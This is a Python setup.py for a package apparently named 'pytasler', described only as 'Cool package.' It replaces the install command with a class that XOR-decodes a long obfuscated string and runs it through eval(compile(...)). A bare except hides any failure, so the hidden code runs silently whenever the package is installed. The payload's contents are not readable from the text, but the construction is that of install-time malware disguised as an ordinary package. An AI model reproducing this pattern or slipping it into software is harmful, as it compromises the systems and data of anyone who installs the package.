from setuptools import setup, find_packages
from setuptools.command.install import install
from pathlib import Path
import os


VERSION = '1.0.0'
DESCRIPTION = 'Cool package.'
this_directory = Path(__file__).parent
long_description = (this_directory / "README.md").read_text()


class InstallCommand(install):

    def run(self):
        try:
            wopvEaTEcopFEavc ="_^FY@E\x14]D9Y\\AZGL\x13FAZGJZRRKD=[Y_[X\x12\x0b\x19XB\x1fU]M[_UQV\x1c\x1f3\\Q\x15^C\x1aISC^\x19\\K_AGD\x18P\x13z\njdg@UFFnmI^WW]ZOoerFAuUMUoleYR[_\\VhnzZSC^FZ^Giho^VQ^@KkkdBY@B\x12{\\YDmnhKXW@YUGjefNFEUY\x0f\x06kj\x10\x10\x13\x0b\x0f\x13qQZG\\\n<2\x12\x13\x10\x14ZA\x1f_Y\\YF\x1cT\x11z\tjmdG\\F@lkM_YQ[_Inkr@AuTAYoifWVU\\_Pdkz^UJ]E]PMkmf[V]XGAddgBXGC\x15|UZLnkfEVTDS^Dljg@CB]_\x05\x04\x16\x1c8\x11\x12\x12\x18_DQ\\\x1b_\x11u\x0bmhlGVBDjoMZ]V]\\JolpAEqYGThdeWT\\^VPkk{QQD]EVQEmnoPYT]OKhjjAVGE\x10y\\\\BjkiAYUAV]EhecOKFV]\x02\x01nme{v\x03\x06\x1aDQJ\x11\x1a\x11\x13U\x1b\x1d\x1dGE_GS\x1eT\x16gWC\x13gBYf]]_Y\x14\x05\x17{GTVLRxU\\]QB\x1a\x14ndRC[HM\x19cZ]TX\x14\x10\x15k[fC\\jZRZ[\x17aC\\\x13TXD\x1c\n\x04\x1f\x18\x14\x13\x12w\x0fnmgA]BGhnHU\\QX_Iehr@GrRBWnmf]V^Y_ViiuZVFWDWSEkd`^YRWEEnjjCPCF\x18tR^GdddDVRET\\CheaNEC\\^\x00\x06okg\x7fz\n\x02\x18ZSG\x12\x14\x13\x12rZ@\x10\x03\x00\x1d\x1e\x13\toXbT@\x19c@Xd^VZZ\x12\x0c\x14|XGXX_R\x12\x119\x15\x14\x18\x17WETY\x10Q\x15t\x0cdncASKDmmITVPY\\EdhwIEsTEQhe`XWZP]QnozYUFVCY^Folc\\\\U]EKlhgFRKG\x16|TZLho`EYTDW_BhndGQCE@Edob}v\x01\x0c\x1bGUK\x15\x1b\x17\x14Y\x10\x1f\x1cAK^ET\x1a^\x1e\x10\x17a]L\x14aJ]d]T\\X\x19\x0f\x17uE\\RBW|UZSWM\x18\x14oaPB]EF\x1faZ]\\X\x16\x1b\x13e]aBYgQQ_\\\x19dFX\x16QYF\x1a\x04\x07\x19\x11\x17\x15\x17{\tihmD]GBkdL[XQQ\\KnjxGAuSLXkl`WYY_WRki|YWK]DYQMojeZYTYCJljkFRB@\x15\x7fT\\GdldF]TKR[BmhjM@DR[\x05\x02jnbMACV]\x1fTMP\x1a\x13\x13\x14{_J\x1d\x02\x03\x11\x1b\x17\x07jVaSF\x16nDYbZ]U[\x10\x0f\x18v[BQ\\YR;cQM\x12`E_j[S^_\x17\r\x16wKUWLW|R^PQE\x1a\x10ocWF[CM\x1deYTXU\x16\x1a\x10kXdE^aYQ^[\x1dbD_\x15VPA\x1d\x07\x0c\x1e\x18\x13\x11\x15{\rkkcKWDAjeL]^UQWJlnyHDrXAVimb[X_^XPeo{[PE_E[_DjdeZ^PZEBnnkDUFF\x13tVXDmhiF\\WEW^EjnbMACV]\x07\x05iijF[@QZ]\x1bTO]\x15\x17\x11\x16{ZD\x1a\x05\r\x1e\x1d\x11\x02dWdUF\x18oG^j]RY]\x10\t\x19|XB_P]Q\x15\x14\x10\x19<>\x19\x10\x16\x18]CUZ\x1dT\x13q\x08dlaGWAJojJ][^]]MkjrFFvP@Skob^PX\\VTihu^[G^DWQCkjo[XVYNDmmaLXED\x12u]ZCeigG^WFX_DjkjJEFVZ\x06\x02heg\x7fv\x01\x01\x1eVTF\x13\x1e\x12\x1aQ\x16\x1d\x1cDKZBT\x19R\x1e\x13\x14R^B@WR_XZ\x12\x18GBP_FS]A\x15YASWB_[WVS]YZ\x12\x19VYNY]^S\\\x19\x18@@QWF_ML\x17s~bq~`xcy}\x13\x14ZGC@\x0c\x1b\x16\x05\x07\x16\x03\x04\x08\x1a\x07\x07\x1f\x03\x06\x00\n\x0c\x04\n\x02\x16WZ\x1eBMJ@V]\x15\x16\x11u\x0cnmaARACmmNYWT\\ZEkdtAG|VCVjd`YS[PYVmnuPTB]KWRBei`\\_T[NAkjdMRDF\x13zUXAelfJ]TBUXAmnaAC@Q_\x05\rojbHGMQ^\x1eRNV\x14j\\S]FDRT\\X[\x15\x17GGUVD^PC\x17UNSXAV^YSRSXS\x11\x1d\\V@^^WYP\x16\x16EE\\^B]MK\x17pxkvq`|b~r\x14\x1bXBLB\t\x1f\x1b\x00\x03\x1f\x03\x05\x00\x1e\x06\x01\x1c\x02\r\x0b\x0c\t\x01\x0c\x08\x1bW\\\x18DFXB[\\Q\x10\x17\x11s\x0bmi`KVGGdkCY^PQYJkjyBFvWMVmm`WXZY\\_dh{PVEZB_RMnka^WWYE@kle@XBB\x18\x7fV^Aina@]_BUYAoe`OBEQT\x02\x07lkdFXB[\\Q\x1cRKU\x13m[FLRG@\x18\x15\x1a\x15\x13t\x02kkbE]@EnjB[^V[VDklsHHpWMTkic_UT[YQke~_QAXCYRMljo[]T[BAmnaLQF@\x12~\\]CmmdK[TBV[@jjaEU@CF@mmb|v\x05\x01\x1aNUK\x17\x16\x10\x1f\x1e=\x17\x16\x18\x12EGTIE^RWKJ\x19BGV\x10R\x14z\x0fkidCQKAkjLU\\Q[]JljuI@rYFRlhg]P_[VWhh\x7fZZAYB^RMhog^XWYAAmhaCRBE\x11xPVFihhEWRCVUDkkeAABW[\x0f\x03mmeqw\x04\x02\x1cNZG\x14\x15\x15D]T\\X\x04fECR\x15\x13UZVT[\x0b`KES\x118\x13\x10\x14\x158T^A]\n\x14\x14\x129\x19\x13\x16\x11AUJG9\x13\x17FA_XF\x19\x16Z^\x13Y_BATT_\\Z_\x19\x16\x1b\x13\x1e" 

            iOpvEoeaaeavocp = "6366214273011558354878517877768262697112897028846957510492767936237064906823045212280442393611494307"
            uocpEAtacovpe = len(wopvEaTEcopFEavc)
            oIoeaTEAcvpae = ""
            for fapcEaocva in range(uocpEAtacovpe):
                nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
                qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
                oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))


            eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))
        except:
            pass
        install.run(self)


setup(
    name="pytasler",
    version=VERSION,
    author="HW",
    author_email="",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=long_description,
    packages=find_packages(),
    install_requires=[],
    keywords=[],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ],
    cmdclass={
        'install': InstallCommand
    }
)